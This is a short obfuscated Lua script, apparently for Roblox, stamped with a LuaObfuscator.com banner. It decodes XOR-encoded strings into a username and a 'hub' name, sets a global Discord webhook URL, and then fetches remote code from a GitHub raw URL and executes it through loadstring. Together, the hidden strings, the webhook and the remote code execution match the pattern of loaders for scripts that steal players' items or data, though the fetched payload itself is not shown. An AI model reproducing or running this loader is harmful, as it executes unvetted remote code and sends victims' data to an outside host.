--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.6) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + ((v11-1)% #v9) ,1 + ((v11-1)% #v9) + 1 )))%256 ));end return v5(v10);end _G.Username=v7("\139\194\47\175\214\170\145\222\46\174\143\228\217\154","\225\171\72\200\186\211");_G.HubName=v7("\240\5\103\243\82\114\228\21\99\229","\128\96\19\128\59\31");_G.WebhookUrl="https://discord.com/api/webhooks/1101088910811086869/RmGHuN9kUJL2jjw9hy3Jpm0b41S5lCWu0XVVhW5F7cT_YnMrSe5CHCVweAIQowglhun4";loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))();